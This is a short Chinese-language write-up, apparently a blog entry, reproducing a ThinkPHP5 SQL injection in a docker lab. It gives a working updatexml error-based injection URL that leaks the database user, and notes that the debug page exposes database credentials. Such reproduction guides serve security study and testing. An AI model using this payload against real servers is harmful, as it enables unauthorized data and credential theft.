---
title: "ThinkPHP5 SQL 注入漏洞 && 敏感信息泄露"
date: 2026-10-13 09:02:36
categories:
  - WebSecurity
  - CVE
  - "三方组件"
  - "ThinkPHP"
tags:
  - "ThinkPHP"
  - "SQL注入"
  - "信息泄露"
  - "漏洞复现"
---
## 漏洞描述

漏洞原理说明：

- https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html
- https://xz.aliyun.com/t/125

## 环境搭建

运行环境：

```
docker-compose up -d
```

启动后，访问 `http://your-ip/index.php?ids[]=1&ids[]=2`，即可看到用户名被显示了出来，说明环境运行成功。

## 漏洞复现

访问 `http://your-ip/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1`，信息成功被爆出：

![image-20220302151819426](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/framework/images/202203021518532.png)

当然，这是一个比较鸡肋的 SQL 注入漏洞。但通过 DEBUG 页面，我们找到了数据库的账号、密码：

![image-20220302151841408](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/framework/images/202203021518495.png)

这又属于一个敏感信息泄露漏洞。

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/framework/ThinkPHP5-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-%26%26-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2.md)
